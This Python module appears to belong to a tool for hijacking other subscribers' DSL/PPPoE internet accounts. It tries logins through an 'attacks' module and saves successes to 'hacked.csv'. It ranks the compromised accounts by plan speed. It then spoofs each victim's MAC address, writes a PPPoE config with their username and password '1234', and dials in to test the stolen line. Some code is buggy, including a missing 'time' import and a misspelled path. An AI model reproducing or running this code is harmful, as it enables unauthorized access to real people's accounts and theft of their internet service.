import attacks
from user import User
import os
import speedtest
from datetime import datetime

TESTED = []
DSL = 'noipdefault\ndefaultroute\nreplacedefaultroute\nhide-password\nnoauth\npersist\nplugin rp-pppoe.so eth0\nuser ' \
      '"{}"\nusepeerdns '


def init(args):
    global TESTED
    TESTED = args


def test_speed():
    s = speedtest.Speedtest()
    s.get_servers()
    s.get_best_server()
    s.download()
    res = s.results.dict()
    return '{:.2f} MB/s'.format(res["download"] / 8000000)


def speed(plan):
    try:
        plan = plan[:plan.index('Mbps')]
        plan = plan[plan.rindex('_') + 1:]
        return int(plan)
    except:
        return 0


def test_login(username):
    if username not in TESTED:
        user = attacks.login(User(username[:-1]))

        if user:
            with open('resources/hacked.csv', 'a+') as file:
                file.write(str(user))

        with open('resources/tested.txt', 'a+') as file:
            file.write(username)


def get_hacked_users():
    users = []
    for i in open('resources/hacked.csv', 'r').readlines():
        try:
            account = i.split(',')
            user = User(account[0], '1234', account[1], speed(account[2]))
            users.append(user)
        except:
            pass

    return sorted(users, key=lambda x: x.plan, reverse=True)


def test_connection(user: User):
    os.popen('sudo poff -a')
    os.popen('sudo ifconfig eth0 down')
    os.popen(f'sudo macchanger -m {user.mac} eth0')
    os.popen('sudo ifconfig eth0 down')
    os.popen(f'sudo echo "{DSL.format(user.username)}" > /etc/ppp/peers/dsl-provider')
    os.popen(f'sudo echo ""{user.username}" * "1234"" > /etc/ppp/peers/dsl-provider')
    os.popen('sudo pon dsl-provider')
    
    connected = False
    retry=5
    while connected!=True or retry>0:
        try:
            user.plan=test_speed()
            with open(f'resouces/connected-{datetime.today().strftime("%Y-%m-%d")}.csv','a+') as f:
                f.write(str(user))
            connected=True
        except:
            time.sleep(5)
            retry=retry-1